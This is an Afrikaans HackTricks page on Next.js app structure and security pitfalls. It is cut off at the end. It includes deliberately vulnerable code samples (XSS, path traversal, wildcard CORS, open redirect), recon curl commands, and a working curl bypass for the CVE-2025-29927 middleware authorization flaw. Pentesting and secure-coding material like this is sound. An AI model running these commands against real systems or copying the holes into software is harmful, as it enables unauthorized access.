# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Algemene argitektuur van 'n Next.js-toepassing

### Tipiese lêerstruktuur

'n Standaard Next.js-projek volg 'n spesifieke lêer- en gidsstruktuur wat funksies soos routing, API-eindpunte en bestuur van statiese assets vergemaklik. Hier is 'n tipiese uitleg:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kern-gidse en lêers

- **public/:** Huisves statiese bates soos beelde, lettertipes en ander lêers. Lêers hier is toeganklik by die wortelpad (`/`).
- **app/:** Sentraal gids vir jou toepassing se bladsye, layouts, komponente, en API-roetes. Omarm die **App Router** paradigma, wat gevorderde roete-funksies en skeiding tussen server- en kliëntkomponente moontlik maak.
- **app/layout.tsx:** Definieer die wortellay-out vir jou toepassing, wat om alle bladsye draai en konstante UI-elemente soos headers, voettekste en navigasiebalks verskaf.
- **app/page.tsx:** Dien as die toetspunt vir die wortelroete `/`, en vertoon die tuisblad.
- **app/[route]/page.tsx:** Hanteer statiese en dinamiese roetes. Elke vouer binne `app/` verteenwoordig 'n roete-segment, en `page.tsx` binne daardie vouers ooreenstem met die roete se komponent.
- **app/api/:** Bevat API-roetes, wat jou toelaat om serverless funksies te skep wat HTTP-versoeke hanteer. Hierdie roetes vervang die tradisionele `pages/api`-gids.
- **app/components/:** Huisves herbruikbare React-komponente wat oor verskillende bladsye en layouts gebruik kan word.
- **app/styles/:** Bevat globale CSS-lêers en CSS-modules vir komponent-gebaseerde stylering.
- **app/utils/:** Sluit hulpfunksies, hulpmodules en ander nie-UI logika in wat oor die toepassing gedeel kan word.
- **.env.local:** Stoor omgewingsveranderlikes spesifiek vir die plaaslike ontwikkelingsomgewing. Hierdie veranderlikes word **nie** na versiebeheer gecommit nie.
- **next.config.js:** Pas Next.js-gedrag aan, insluitend webpack-konfigurasies, omgewingsveranderlikes en sekuriteitsinstellings.
- **tsconfig.json:** Konfigureer TypeScript-instellings vir die projek, wat tipekontrole en ander TypeScript-funksies moontlik maak.
- **package.json:** Bestuur projekafhanklikhede, skripte en metadata.
- **README.md:** Verskaf dokumentasie en inligting oor die projek, insluitend opstelinstruksies, gebruiksgidse en ander relevante besonderhede.
- **yarn.lock / package-lock.json:** Sluit die projek se afhanklikhede vas op spesifieke weergawes, wat konsekwente installasies oor verskillende omgewings verseker.

## Kliëntkant in Next.js

### Lêergebaseerde roetering in die `app`-gids

Die `app`-gids is die hoeksteen van roete-beheer in die nuutste Next.js-weergawes. Dit maak gebruik van die lêerstelsel om roetes te definieer, wat roete-bestuur intuïtief en skaalbaar maak.

<details>

<summary>Hanering van die wortelpad /</summary>

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Belangrike lêers:**

- **`app/page.tsx`**: Hanteer versoeke na die wortelpad `/`.
- **`app/layout.tsx`**: Definieer die uitleg vir die toepassing, wat rondom alle bladsye geplaas word.

**Implementering:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx`-lêer direk onder die `app`-gids ooreenstem met die `/`-roete.
- **Rendering:** Hierdie komponent lewer die inhoud vir die tuisblad.
- **Layout Integrasie:** Die `HomePage`-komponent word ingesluit deur die `layout.tsx`, wat kop- en voettekste, en ander algemene elemente kan bevat.

</details>

<details>

<summary>Hantering van Ander Statische Paaie</summary>

**Voorbeeld: `/about` Route**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Toelichting:**

- **Route-definisie:** Die `page.tsx` file binne die `about` gids stem ooreen met die `/about` roete.
- **Rendering:** Hierdie komponent gee die inhoud weer vir die about bladsy.

</details>

<details>

<summary>Dinamiese roetes</summary>

Dinamiese roetes laat toe om paaie met veranderlike segmente te hanteer, wat toepassings in staat stel om inhoud te vertoon gebaseer op parameters soos IDs, slugs, ens.

**Voorbeeld: `/posts/[id]` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Verduideliking:**

- **Dinamiese segment:** `[id]` dui 'n dinamiese segment in die route aan, wat die `id` parameter vanaf die URL vasvang.
- **Toegang tot parameters:** Die `params` objek bevat die dinamiese parameters, beskikbaar binne die component.
- **Roete-ooreenkoms:** Enige pad wat met `/posts/*` ooreenstem, soos `/posts/1`, `/posts/abc`, ens., sal deur hierdie component hanteer word.

</details>

<details>

<summary>Geneste Roetes</summary>

Next.js ondersteun geneste routing, wat hiërargiese roetestrukture toelaat wat die gidsindeling weerspieël.

**Voorbeeld: `/dashboard/settings/profile` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Verduideliking:**

- **Diepe genesting:** Die `page.tsx` file inside `dashboard/settings/profile/` corresponds to the `/dashboard/settings/profile` route.
- **Hiërargie-weerspieëling:** Die gidsstruktuur weerspieël die URL-pad, wat onderhoudbaarheid en duidelikheid verbeter.

</details>

<details>

<summary>Catch-All Routes</summary>

Catch-all routes hanteer meerdere geneste segmente of onbekende paaie, en bied buigsaamheid in roetehantering.

**Voorbeeld: `/*` Route**

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Verduideliking:**

- **Alles-insluitende segment:** `[...slug]` vang al die oorblywende padsegmente op as 'n array.
- **Gebruik:** Nuttig vir die hantering van dinamiese routeringscenario's soos gebruiker-gegenereerde paaie, geneste kategorieë, ens.
- **Roete-ooreenstemming:** Paaie soos `/anything/here`, `/foo/bar/baz`, ens., word deur hierdie komponent hanteer.

</details>

### Potensiële kliëntkant-kwesbaarhede

Alhoewel Next.js 'n veilige fondament bied, kan onvanpaste koderingpraktyke kwesbaarhede inbring. Belangrike kliëntkant-kwesbaarhede sluit in:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-aanvalle vind plaas wanneer kwaadwillige skripte in vertroude webwerwe ingespuit word. Aanvallers kan skripte in gebruikers se blaaier uitvoer, data steel of aksies namens die gebruiker uitvoer.

**Voorbeeld van kwesbare kode:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Waarom dit kwesbaar is:** Om `dangerouslySetInnerHTML` met onbetroubare insette te gebruik laat aanvallers toe om kwaadwillige skripte in te voeg.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Dit gebeur wanneer gebruikersinsette verkeerd hanteer word in sjablone, wat aanvallers toelaat om sjablone of uitdrukkings in te voeg en uit te voer.

**Voorbeeld van kwesbare kode:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Waarom dit kwesbaar is:** As `template` of `data` kwaadwillige inhoud bevat, kan dit lei tot die uitvoering van onbedoelde kode.

</details>

<details>

<summary>Client Path Traversal</summary>

Dit is 'n kwesbaarheid wat aanvallers toelaat om client-side paaie te manipuleer om onbedoelde aksies uit te voer, soos Cross-Site Request Forgery (CSRF). Anders as server-side path traversal, wat die server se lêerstelsel teiken, fokus CSPT op die uitbuiting van client-side-meganismes om legitieme API-versoeke na kwaadwillige endpoints om te lei.

**Voorbeeld van Kwesbare Kode:**

'n Next.js-toepassing laat gebruikers toe om lêers op te laai en af te laai. Die aflaaifunksie is op die client-side geïmplementeer, waar gebruikers die lêerpad kan spesifiseer om af te laai.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Aanvalscenario

1. **Doel van die aanvaller**: Voer 'n CSRF-aanval uit om 'n kritieke lêer te verwyder (bv. `admin/config.json`) deur die `filePath` te manipuleer.
2. **Uitbuiting van CSPT**:
- **Kwaadaardige invoer**: Die aanvaller maak 'n URL met 'n gemanipuleerde `filePath`, bv. `../deleteFile/config.json`.
- **Resulterende API-oproep**: Die client-side kode maak 'n versoek na `/api/files/../deleteFile/config.json`.
- **Server-side hantering**: As die server die `filePath` nie valideer nie, verwerk dit die versoek en kan sensitiewe lêers moontlik verwyder of blootgestel word.
3. **Uitvoering van CSRF**:
- **Gemaakte skakel**: Die aanvaller stuur die slagoffer 'n skakel of embeds 'n kwaadwillige script wat die aflaaiversoek met die gemanipuleerde `filePath` aktiveer.
- **Uitkoms**: Die slagoffer voer onbewustelik die aksie uit, wat tot ongemagtigde lêertoegang of verwydering lei.

#### Hoekom dit kwesbaar is

- **Gebrek aan invoervalidasie**: Die client-side laat arbitrêre `filePath` insette toe, wat path traversal moontlik maak.
- **Vertrou op klientinsette**: Die server-side API vertrou en verwerk die `filePath` sonder sanitisering.
- **Potensiële API-aksies**: As die API-endpoint staatveranderende aksies uitvoer (bv. delete, modify files), kan dit via CSPT uitgebuit word.

</details>

### Recon: statiese export roete-ontdekking via _buildManifest

Wanneer `nextExport`/`autoExport` waar is (statiese export), Next.js openbaar die `buildId` in die HTML en bedien 'n build manifest by `/_next/static/<buildId>/_buildManifest.js`. Die `sortedPages` array en route→chunk mapping daar som elke vooraf-gerenderde bladsy op sonder brute force.

- Kry die buildId vanaf die root respons (dikwels onderaan) of vanaf `<script>` tags wat `/_next/static/<buildId>/...` laai.
- Haal die manifest en onttrek roetes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Gebruik die ontdekte paaie (byvoorbeeld `/docs`, `/docs/content/examples`, `/signin`) om auth testing en endpoint discovery aan te dryf.

## Bedienerkant in Next.js

### Bedienerkant-rendering (SSR)

Bladsye word by elke versoek op die bediener gerender, wat verseker dat die gebruiker volledig gerenderde HTML ontvang. In hierdie geval moet jy jou eie aangepaste server skep om die versoeke te verwerk.

**Gebruikstoepassings:**

- Dinamiese inhoud wat gereeld verander.
- SEO-optimalisering, aangesien soekenjins die volledig gerenderde bladsy kan kruip.

**Implementering:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statiese site-generering (SSG)

Bladsye word vooraf-gerender tydens die boutyd, wat lei tot vinniger laaitye en verminderde bedienerlas.

**Gebruiksgevalle:**

- Inhoud wat nie gereeld verander nie.
- Blogs, dokumentasie, bemarkingsbladsye.

**Implementering:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless Functions (API Routes)

Next.js maak dit moontlik om API-endpoints as serverless functions te skep. Hierdie funksies loop op aanvraag sonder die behoefte aan 'n toegewyde bediener.

**Gebruikstoepassings:**

- Hantering van vorminskrywings.
- Interaksie met databasisse.
- Verwerking van data of integrasie met derdeparty-APIs.

**Implementering:**

Met die bekendstelling van die `app` directory in Next.js 13 het routing en API-hantering meer buigsaam en kragtig geword. Hierdie moderne benadering stem nou nou ooreen met die lêer-gebaseerde routing-stelsel maar bied verbeterde vermoëns, insluitend ondersteuning vir server- en kliëntkomponente.

#### Basiese Route Handler

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementering:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Verduideliking:**

- **Ligging:** API-roetes word geplaas onder die `app/api/` directory.
- **Lêerbenaming:** Elke API-endpoint sit in sy eie map wat 'n `route.js` of `route.ts`-lêer bevat.
- **Geëksporteerde funksies:** In plaas van 'n enkele default export, word spesifieke HTTP-metode funksies (bv. `GET`, `POST`) geëksporteer.
- **Response-hantering:** Gebruik die `Response` constructor om responses terug te gee, wat meer beheer oor headers en statuskodes toelaat.

#### Hoe om ander paadjies en metodes te hanteer:

<details>

<summary>Hantering van spesifieke HTTP-metodes</summary>

Next.js 13+ laat jou toe om handlers vir spesifieke HTTP-metodes binne dieselfde `route.js` of `route.ts`-lêer te definieer, en bevorder duideliker en meer georganiseerde code.

**Voorbeeld:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Meervoudige Eksporte:** Elke HTTP-metode (`GET`, `PUT`, `DELETE`) het sy eie uitgevoerde funksie.
- **Parameters:** Die tweede argument gee toegang tot roete-parameters via `params`.
- **Verbeterde Responses:** Groter beheer oor response-objekte, wat presiese header- en statuskodebeheer moontlik maak.

</details>

<details>

<summary>Catch-All en Geneste Roetes</summary>

Next.js 13+ ondersteun gevorderde routeringsfunksies soos catch-all roetes en geneste API-roetes, wat meer dinamiese en skaalbare API-strukture moontlik maak.

**Catch-All Route Voorbeeld:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Syntax:** `[...]` dui 'n catch-all segment aan, wat alle geneste paaie vasvang.
- **Usage:** Nuttig vir APIs wat roetes met wisselende dieptes of dinamiese segmente moet hanteer.

**Geneste Roetes Voorbeeld:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Verduideliking:**

- **Diepe genesting:** Laat geneste API-strukture toe wat hulpbronverhoudings weerspieël.
- **Parametertoegang:** Verkry maklik toegang tot meerdere roeteparameters via die `params`-objek.

</details>

<details>

<summary>Hantering van API-roetes in Next.js 12 en vroeër</summary>

## API-roetes in die `pages`-gids (Next.js 12 en vroeër)

Voordat Next.js 13 die `app`-gids en verbeterde routeringsfunksionaliteit bekendgestel het, is API-roetes hoofsaaklik binne die `pages`-gids gedefinieer. Hierdie benadering word steeds wyd gebruik en deur Next.js 12 en vroeër weergawes ondersteun.

#### Basiese API-roete

**Lêerstruktuur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Verduideliking:**

- **Ligging:** API routes is geleë onder die `pages/api/` directory.
- **Export:** Gebruik `export default` om die handler-funksie te definieer.
- **Funksiehandtekening:** Die handler ontvang `req` (HTTP-versoek) en `res` (HTTP-antwoord) objekte.
- **Roetering:** Die lêernaam (`hello.js`) stem ooreen met die endpoint `/api/hello`.

#### Dinamiese API-roetes

**Lêerstruktuur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Verduideliking:**

- **Dinamiese segmente:** Vierkantige hakies (`[id].js`) dui dinamiese roete-segmente aan.
- **Toegang tot parameters:** Gebruik `req.query.id` om by die dinamiese parameter uit te kom.
- **Hantering van metodes:** Gebruik voorwaardelike logika om verskillende HTTP-metodes (`GET`, `PUT`, `DELETE`, ens.) te hanteer.

#### Hantering van verskillende HTTP-metodes

Alhoewel die basiese API-roetevoorbeeld alle HTTP-metodes binne een funksie hanteer, kan jy jou kode struktureer om elke metode uitdruklik te hanteer vir beter duidelikheid en onderhoudbaarheid.

**Voorbeeld:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste praktyke:**

- **Skeiding van verantwoordelikhede:** Maak duidelike skeiding van logika vir verskillende HTTP-metodes.
- **Konsekwentheid van antwoorde:** Verseker konsekwente antwoordstrukture om kliëntkant-hantering te vergemaklik.
- **Fouthantering:** Hanteer onondersteunde metodes en onverwagte foute op 'n elegante wyse.

</details>

### CORS-konfigurasie

Beheer watter oorspronge toegang tot jou API-roetes kan kry, en beperk sodoende Cross-Origin Resource Sharing (CORS)-kwesbaarhede.

**Slegte Konfigurasie Voorbeeld:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Let daarop dat **CORS ook in al die API-roetes gekonfigureer kan word** binne die **`middleware.ts`**-lêer:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Probleem:**

- **`Access-Control-Allow-Origin: '*'`:** Laat enige webwerf toe om toegang tot die API te kry, wat moontlik kwaadwillige webwerwe toelaat om sonder beperkings met jou API te kommunikeer.
- **Breë metode-toestemming:** Om alle metodes toe te laat kan aanvallers in staat stel om ongewenste aksies uit te voer.

**Hoe aanvallers dit uitbuit:**

Aanvallers kan kwaadwillige webwerwe skep wat versoeke aan jou API maak, moontlik misbruik maak van funksies soos data-ophaling, data-manipulasie, of die veroorsaking van ongewenste aksies namens geauthentiseerde gebruikers.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Bedienerkode-blootstelling aan die kliëntkant

Dit kan maklik gebeur dat **kode wat op die server gebruik word ook in kode wat aan die kliëntkant blootgestel en gebruik word**. Die beste manier om te verseker dat 'n lêer se kode nooit aan die kliëntkant blootgestel word nie, is om hierdie import aan die begin van die lêer te gebruik:
```js
import "server-only"
```
## Sleutel-lêers en hul rolle

### `middleware.ts` / `middleware.js`

**Ligging:** Wortel van die projek of binne `src/`.

**Doel:** Voer kode uit in die server-side serverless function voordat 'n versoek verwerk word, wat take soos authenticatie, omleidings, of die wysiging van antwoorde moontlik maak.

**Uitvoeringsvloei:**

1. **Inkomende versoek:** Die middleware onderskep die versoek.
2. **Verwerking:** Voer bewerkings uit gebaseer op die versoek (bv. kontroleer authenticatie).
3. **Wysiging van antwoord:** Kan die antwoord verander of beheer deurgee aan die volgende handler.

**Voorbeelde van gebruiksgevalle:**

- Herlei gebruikers wat nie geauthentiseer is nie.
- Voeg pasgemaakte headers by.
- Log versoeke.

**Voorbeeldkonfigurasie:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

As autorisasie in middleware afgedwing word, kan geraakte Next.js-releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) omseil word deur die `x-middleware-subrequest` header in te spuit. Die framework sal middleware-rekursie oorslaan en die beskermde bladsy teruggee.

- Standaardgedrag is gewoonlik 'n 307-omleiding na 'n aanmeldroete soos `/api/auth/signin`.
- Stuur 'n lang `x-middleware-subrequest` waarde (herhaal `middleware` om `MAX_RECURSION_DEPTH` te bereik) om die respons na 200 te draai:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Omdat geauthentiseerde bladsye baie subbronne laai, voeg die header by elke versoek (bv. Burp Match/Replace met 'n leë match-string) om te verhoed dat assets herlei word.

### `next.config.js`

**Location:** Wortel van die projek.

**Purpose:** Konfigureer Next.js-gedrag, skakel funksies aan of af, pas webpack-configurasies aan, stel omgewingsveranderlikes in, en konfigureer verskeie sekuriteitsfunksies.

**Key Security Configurations:**

<details>

<summary>Sekuriteitsheaders</summary>

Security headers verbeter die sekuriteit van jou toepassing deur blaaiers te instrueer hoe om inhoud te hanteer. Hulle help om verskeie aanvalle te beperk soos Cross-Site Scripting (XSS), Clickjacking, and MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Voorbeelde:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Beeldoptimaliseringsinstellings</summary>

Next.js optimaliseer beelde vir prestasie, maar wanopstellings kan lei tot sekuriteitskwesbaarhede, soos om onbetroubare bronne toe te laat om kwaadwillige inhoud in te voeg.

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Probleem:**

- **`'*'`:** Laat toe dat beelde vanaf enige eksterne bron gelaai word, insluitend onbetroubare of kwaadwillige domeine. Aanvallers kan beelde aanbied wat kwaadwillige payloads bevat of inhoud wat gebruikers mislei.
- Nog 'n probleem kan wees om 'n domein toe te laat **waar enigiemand 'n beeld kan oplaai** (soos `raw.githubusercontent.com`)

**Hoe aanvallers dit misbruik:**

Deur beelde van kwaadwillige bronne in te voeg, kan aanvallers phishing-aanvalle uitvoer, misleidende inligting vertoon, of kwesbaarhede in beeldrenderingsbiblioteke uitbuit.

</details>

<details>

<summary>Blootstelling van omgewingsveranderlikes</summary>

Hanter sensitiewe inligting soos API-sleutels en databasis-aanmeldbewyse veilig sonder om dit aan die kliënt bloot te stel.

#### a. Blootstelling van Sensitiewe Veranderlikes

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Probleem:**

- **`SECRET_API_KEY`:** Sonder die `NEXT_PUBLIC_` voorvoegsel stel Next.js nie veranderlikes aan die kliënt bloot nie. As dit egter per ongeluk met die voorvoegsel (bv. `NEXT_PUBLIC_SECRET_API_KEY`) aangedui word, raak dit vanaf die kliëntkant toeganklik.

**Hoe aanvallers dit misbruik:**

As sensitiewe veranderlikes aan die kliënt blootgestel word, kan aanvallers dit verkry deur die kliënt-kantkode of netwerkversoeke te ondersoek, en sodoende ongemagtigde toegang tot APIs, databases, of ander dienste verkry.

</details>

<details>

<summary>Omleidings</summary>

Beheer URL-omleidings en rewrites binne jou toepassing, en verseker dat gebruikers behoorlik gerig word sonder om open redirect vulnerabilities in te lei.

#### a. Open Redirect Vulnerability

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Probleem:**

- **Dinamiese bestemming:** Laat gebruikers toe om enige URL te spesifiseer, wat open redirect attacks moontlik maak.
- **Vertrou gebruikersinvoer:** Omleidings na URLs wat deur gebruikers verskaf word sonder validering kan lei tot phishing, malware distribution, of credential theft.

**Hoe aanvallers dit misbruik:**

Aanvallers kan URL's saamstel wat blyk om van jou domein te kom maar gebruikers na kwaadwillige webwerwe omlei. Byvoorbeeld:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gebruikers wat die oorspronklike domein vertrou, kan onbewustelik na skadelike webwerwe navigeer.

</details>

<details>

<summary>Webpack Configuration</summary>

Pas Webpack-konfigurasies vir jou Next.js-app aan, wat onbedoeld sekuriteitskwesbaarhede kan veroorsaak as dit nie versigtig hanteer word nie.

#### a. Sensitiewe modules blootstel

**Voorbeeld van slegte konfigurasie:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Probleem:**

- **Exposing Sensitive Paths:** Aliasing sensitiewe directories en die toelaat van client-side toegang kan leak vertroulike inligting.
- **Bundling Secrets:** As sensitiewe lêers vir die client saamgebund word, word hul inhoud toeganklik deur source maps of deur die client-side kode te inspekteer.

**How attackers abuse it:**

Attackers kan toegang kry tot of die toepassing se directory-struktuur rekonstruer, en sodoende moontlik sensitiewe lêers of data vind en exploit.

</details>

### `pages/_app.js` en `pages/_document.js`

#### **`pages/_app.js`**

**Doel:** Oorskryf die standaard App-component, wat globale state, style en layout-komponente moontlik maak.

**Gebruikgevalle:**

- Insluit van globale CSS.
- Byvoeging van layout-wrappers.
- Integrasie van state management libraries.

**Voorbeeld:**
```jsx
// pages/_app.js
import "../styles/globals.css"

